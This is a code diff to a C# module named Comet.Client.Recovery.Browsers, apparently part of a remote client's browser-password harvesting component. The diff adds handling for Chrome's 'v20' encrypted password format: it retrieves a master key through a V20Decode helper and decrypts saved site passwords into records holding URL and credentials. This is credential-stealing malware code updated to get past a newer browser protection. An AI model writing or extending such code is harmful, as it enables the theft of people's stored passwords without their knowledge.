@@ -1,5 +1,6 @@
 ﻿using BCryptNs;
 using Comet.Client.Recovery.Utilities;
+using Comet.Client.Utilities;
 using Comet.Common.DNS;
 using Comet.Common.Models;
 using PwdView;
@@ -58,8 +59,19 @@ namespace Comet.Client.Recovery.Browsers
                         string url = parser.GetValue<string>(i, "origin_url").Trim();
                         if (password_buffer != null && !string.IsNullOrWhiteSpace(username) && !string.IsNullOrWhiteSpace(url))
                         {
-                            byte[] masterKey = GetMasterKey(localStatePath);
-                            string password = DecryptWithKey(password_buffer, masterKey);
+                            byte[] masterKey = null;
+                            string password = "";
+                            if (Encoding.UTF8.GetString(password_buffer).StartsWith("v20"))
+                            {
+                                //把password_buffer转换为字符串
+                                masterKey = V20Decode.GetMasterKey2(localStatePath);
+                                password = DecryptWithKey(password_buffer, masterKey);
+                            }
+                            else
+                            {
+                                masterKey = GetMasterKey(localStatePath);
+                                password = DecryptWithKey(password_buffer, masterKey);
+                            }
                             result.Add(new SaveUser
                             {
                                 Url = url,
